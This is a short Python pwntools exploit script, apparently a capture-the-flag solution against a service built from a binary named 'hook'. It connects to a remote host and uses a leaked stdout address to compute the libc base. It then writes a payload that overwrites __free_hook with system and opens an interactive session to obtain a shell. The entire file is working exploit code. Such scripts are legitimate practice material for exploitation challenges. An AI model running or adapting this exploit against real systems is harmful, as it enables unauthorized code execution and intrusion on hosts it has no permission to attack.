#! /usr/bin/env python3

import pwn
import sys

# pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/hook")
libc = pwn.ELF("src/libc.so.6")

r.recvuntil(b"stdout: ")
stdout = int(r.recvn(14), 16)
lb = stdout - libc.symbols["_IO_2_1_stdout_"]
hook = lb + libc.symbols["__free_hook"]
system = lb + libc.symbols["system"]

pwn.success(hex(lb))

r.sendline(b"32")

payload = pwn.p64(hook)
payload += pwn.p64(system)

r.sendafter(b"Data: ", payload)


r.interactive()